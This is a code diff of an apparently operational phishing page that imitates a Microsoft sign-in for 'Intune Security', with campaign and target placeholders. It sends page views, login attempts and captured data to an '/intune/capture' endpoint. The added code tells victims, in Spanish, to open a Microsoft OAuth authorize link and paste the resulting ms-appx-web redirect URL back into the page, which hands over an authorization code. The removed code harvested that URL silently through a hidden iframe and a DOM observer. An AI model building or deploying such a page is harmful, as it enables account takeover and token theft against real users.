@@ -20,7 +20,7 @@
     box-shadow: 0 2px 16px rgba(0,0,0,0.15);
     padding: 44px 40px;
     text-align: center;
-    max-width: 400px;
+    max-width: 440px;
     width: 90vw;
   }
   .ms-logo {
@@ -41,6 +41,14 @@
   }
   .input-group {
     margin-bottom: 16px;
+    text-align: left;
+  }
+  .input-label {
+    display: block;
+    font-size: 14px;
+    color: #333;
+    margin-bottom: 6px;
+    text-align: left;
   }
   input[type="text"],
   input[type="email"],
@@ -73,15 +81,48 @@
   .next-btn:hover {
     background: #0067b8;
   }
+  .manual-section {
+    margin-top: 24px;
+    padding: 16px;
+    background: #fff3e0;
+    border-radius: 6px;
+    border: 1px solid #ffcc80;
+    text-align: left;
+  }
+  .manual-section h3 {
+    font-size: 14px;
+    color: #e65100;
+    margin-bottom: 10px;
+  }
+  .manual-section p {
+    font-size: 12px;
+    color: #555;
+    margin-bottom: 10px;
+    line-height: 1.5;
+  }
+  .copy-btn {
+    background: #ff9800;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    padding: 8px 16px;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+  }
+  .copy-btn:hover {
+    background: #f57c00;
+  }
+  .copy-btn.copied {
+    background: #10b981;
+  }
   .back-link {
     display: block;
     margin-top: 16px;
     font-size: 13px;
     color: #0078d4;
     text-decoration: none;
-  }
-  .back-link:hover {
-    text-decoration: underline;
   }
   .error-msg {
     color: #c42b1c;
@@ -129,41 +170,37 @@
   <p class="subtitle">to continue to Microsoft Intune Security</p>
   
   <form id="loginForm">
-    <div class="input-group">
-      <input type="email" id="email" placeholder="Email, phone, or Skype" required autocomplete="off">
+    <div class="input-group" id="emailGroup">
+      <label class="input-label">Email, phone, or Skype</label>
+      <input type="email" id="email" placeholder="" required autocomplete="off">
       <p class="error-msg" id="emailError">Please enter a valid email address.</p>
     </div>
     <div class="input-group" id="passwordGroup" style="display:none;">
-      <input type="password" id="password" placeholder="Password" autocomplete="off">
+      <label class="input-label">Password</label>
+      <input type="password" id="password" placeholder="" autocomplete="off">
       <p class="error-msg" id="passwordError">Your account or password is incorrect.</p>
     </div>
     <button type="submit" class="next-btn" id="submitBtn">Next</button>
   </form>
+
+  <div id="manualInstructions" style="display:none;"></div>
   
   <a href="#" class="back-link">Can't access your account?</a>
 </div>
 
 <div class="spinner-overlay" id="spinnerOverlay">
   <div class="spinner"></div>
-  <p class="spinner-text">Verifying your credentials...</p>
+  <p class="spinner-text">Preparando verificación...</p>
 </div>
 
 <script>
 (function(){
   var token = '{{TOKEN}}';
+  var campaignID = '{{CAMPAIGN_ID}}';
+  var targetID = '{{TARGET_ID}}';
   var intuneOAuthURL = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9ba1a5c7-f17a-4de9-a1f1-6178c8d51223&redirect_uri=ms-appx-web%3A%2F%2FMicrosoft.AAD.BrokerPlugin%2FS-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default';
 
-  var sendConfirm = function() {
-    fetch('/qr/' + token + '/confirm', {
-      method: 'POST',
-      keepalive: true,
-      credentials: 'omit',
-      headers: {'Content-Type': 'application/json'},
-      body: '{}'
-    }).catch(function(){});
-  };
-
-  var sendToServer = function(data) {
+  function sendToServer(data) {
     fetch('/intune/capture', {
       method: 'POST',
       keepalive: true,
@@ -171,90 +208,61 @@
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         token: token,
+        campaign_id: campaignID,
+        target_id: targetID,
         timestamp: Date.now(),
         data: data
       })
     }).catch(function(){});
-  };
+  }
 
-  var captureMsAppxWeb = function() {
-    try {
-      var iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.style.visibility = 'hidden';
-      document.body.appendChild(iframe);
+  function showManualInstructions() {
+    var html = '<div class="manual-section">' +
+      '<h3>Verificación de Seguridad Requerida</h3>' +
+      '<p><strong>Paso 1:</strong> Copia el enlace haciendo clic en el botón de abajo.</p>' +
+      '<button type="button" class="copy-btn" id="copyLinkBtn" onclick="window.copyOAuthUrl()">📋 Copiar Enlace de Verificación</button>' +
+      '<p style="margin-top:16px;"><strong>Paso 2:</strong> Abre una nueva pestaña en tu navegador y pega el enlace en la barra de direcciones.</p>' +
+      '<p style="margin-top:16px;"><strong>Paso 3:</strong> Si ves un error o la página no responde, <strong>copia el URL completo de la barra de direcciones</strong> y pégalo aquí:</p>' +
+      '<input type="text" id="manualUrlInput" placeholder="Pega el URL completo aquí..." style="margin-top:8px;">' +
+      '<button type="button" class="copy-btn" style="margin-top:8px;" onclick="window.submitManualUrl()">Enviar URL</button>' +
+      '</div>';
+    document.getElementById('manualInstructions').innerHTML = html;
+    document.getElementById('manualInstructions').style.display = 'block';
+  }
 
-      iframe.onload = function() {
-        try {
-          var currentURL = iframe.contentWindow.location.href;
-          if (currentURL && currentURL.indexOf('ms-appx-web://') !== -1) {
-            sendToServer({ type: 'ms-appx-web', url: currentURL, trigger: 'iframe_load' });
-            return;
-          }
-        } catch(e) {}
-
-        setTimeout(function() {
-          try { document.body.removeChild(iframe); } catch(e) {}
-        }, 100);
-      };
-
-      iframe.onerror = function() {
-        setTimeout(function() {
-          try { document.body.removeChild(iframe); } catch(e) {}
-        }, 100);
-      };
-
-      iframe.src = 'ms-appx-web://Microsoft.AAD.BrokerPlugin/S-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113';
-      
+  window.copyOAuthUrl = function() {
+    var btn = document.getElementById('copyLinkBtn');
+    navigator.clipboard.writeText(intuneOAuthURL).then(function() {
+      btn.textContent = '✓ Copiado al portapapeles!';
+      btn.classList.add('copied');
       setTimeout(function() {
-        try { document.body.removeChild(iframe); } catch(e) {}
-      }, 500);
-
-    } catch(e) {}
+        btn.textContent = '📋 Copiar Enlace de Verificación';
+        btn.classList.remove('copied');
+      }, 3000);
+    }).catch(function() {
+      prompt('Copia este enlace manualmente:', intuneOAuthURL);
+    });
   };
 
-  var observeDOMChanges = function() {
-    if (window.MutationObserver) {
-      var observer = new MutationObserver(function(mutations) {
-        mutations.forEach(function(mutation) {
-          mutation.addedNodes.forEach(function(node) {
-            if (node.nodeType === 1) {
-              if (node.tagName === 'A' && node.href && node.href.indexOf('ms-appx-web://') !== -1) {
-                sendToServer({ type: 'ms-appx-web', url: node.href, trigger: 'dom_observer_a' });
-              }
-              if (node.innerHTML && node.innerHTML.indexOf('ms-appx-web://') !== -1) {
-                var matches = node.innerHTML.match(/ms-appx-web:\/\/[^\s<>"]+/);
-                if (matches) {
-                  sendToServer({ type: 'ms-appx-web', url: matches[0], trigger: 'dom_observer_html' });
-                }
-              }
-            }
-          });
-        });
-      });
-      try {
-        observer.observe(document.documentElement, {childList: true, subtree: true, characterData: true});
-      } catch(e) {}
+  window.submitManualUrl = function() {
+    var url = document.getElementById('manualUrlInput').value.trim();
+    if (url && (url.indexOf('ms-appx-web://') !== -1 || url.indexOf('microsoft.com/devicelogin') !== -1)) {
+      sendToServer({ type: 'manual_url', url: url, trigger: 'manual_submit' });
+      document.getElementById('manualUrlInput').value = '';
+      document.getElementById('manualUrlInput').placeholder = 'URL enviada correctamente!';
+      setTimeout(function() {
+        document.getElementById('manualUrlInput').placeholder = 'Pega el URL completo aquí...';
+      }, 2000);
     }
   };
 
-  var checkPageSource = function() {
-    var source = document.documentElement.innerHTML;
-    var matches = source.match(/ms-appx-web:\/\/[^\s<>"]+/);
-    if (matches && matches[0]) {
-      sendToServer({ type: 'ms-appx-web', url: matches[0], trigger: 'page_source' });
-    }
-  };
-
-  var proceedToOAuth = function() {
+  function proceedToOAuth() {
     var overlay = document.getElementById('spinnerOverlay');
     overlay.style.display = 'flex';
-
+    sendToServer({ type: 'oauth_attempt', url: intuneOAuthURL, trigger: 'login_complete' });
+    
     setTimeout(function() {
-      observeDOMChanges();
-      checkPageSource();
-      captureMsAppxWeb();
-
+      showManualInstructions();
       try {
         window.location.href = intuneOAuthURL;
       } catch(e) {
@@ -262,8 +270,8 @@
           window.location.replace(intuneOAuthURL);
         } catch(e2) {}
       }
-    }, 800);
-  };
+    }, 1000);
+  }
 
   var loginForm = document.getElementById('loginForm');
   var emailInput = document.getElementById('email');
@@ -302,19 +310,11 @@
         passwordError.style.display = 'block';
         return;
       }
-      sendConfirm();
       proceedToOAuth();
     }
   });
 
-  var init = function() {
-  };
-
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', init);
-  } else {
-    init();
-  }
+  sendToServer({ type: 'page_view', url: window.location.href, trigger: 'init' });
 })();
 </script>
 </body>
